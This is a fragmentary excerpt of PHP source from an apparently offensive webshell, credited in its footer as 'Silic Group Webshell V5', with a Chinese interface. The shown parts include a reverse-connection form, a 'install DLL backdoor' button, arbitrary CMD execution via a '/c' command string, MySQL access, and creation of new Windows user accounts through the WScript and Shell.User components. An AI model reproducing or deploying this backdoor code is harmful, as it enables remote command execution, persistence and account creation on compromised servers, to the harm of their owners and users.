...
<input class="bt" type=submit name=submit value="反弹连接" style="width:120px;height:64px;"><br><br><br></form></div>
END;
}
...
<input class="bt" name="install" type="submit" value="安装DLL后门"> <input class="bt" name="" type="submit" value="执行CMD语句"><br></form>
END;
if ($_POST[post_sql]) {
$link = mysql_connect ($mhost,$muser,$mpass) or die(mysql_error());
...
<input type="text" name="wcmd" id="wcmd" value="{$wcpth}" style="width:300px;"> CMD路径<br />
<input type="text" name="wcmd" id="wcmd" value="{$wcmd}" style="width:300px;"> <input type="submit" value="执行" style="width:80px;">
<br><br><br></form></div>
END;
if($_POST['do']=='do'){
$ww=$wcpth." /c ".$wcmd;
...
新建用户名：<input type="text" name="wuser" id="wuser" value="{$wuser}" style="width:100px;"><br />
新用户密码：<input type="text" name="wpasw" id="wpasw" value="{$wpasw}" style="width:100px;"><br>
...
<h5>本共能使用PHP调用Windows组件中的Wscript组件。<br>
Wscript为调用cmd命令组件<br>{$tip}<a href="?s=jk&winshell=shelluser"> [ Shell.User组件 ] </a><br><br>
<h5>本共能使用PHP调用Windows组件中的Shell.user组件<br>
USER组件为Windows系统用户操作相关组件<br>{$tip}</pre></div>
END;
}
}
/**登陆相关开始**/
...
print<<<END
<div class="actionall"><form action="?s=ch" method="POST">
...
<body>
<div class="outtable">
<div class="topbg">&nbsp;<a href="?s=logout" title="退出">&#8857;</a>&nbsp;{$Server_IP} - {$Server_OS} - {$Server_Soft}</div>
...
<li><a href="?s=ch" id="t_15" onclick="switchTab('t_15')" target="main">更改密码</a></li></ul></td><td>
<iframe name="main" src="?s=a" width="100%" height="100%" frameborder="0"></iframe></td></tr></table></div>
<div class="footer">State: Powered By <a href="http://blackbap.org/" target="_blank">Silic Group</a> [ http://blackbap.org ] - Webshell V5</div></div></body></html>
END;
return false;
}
}
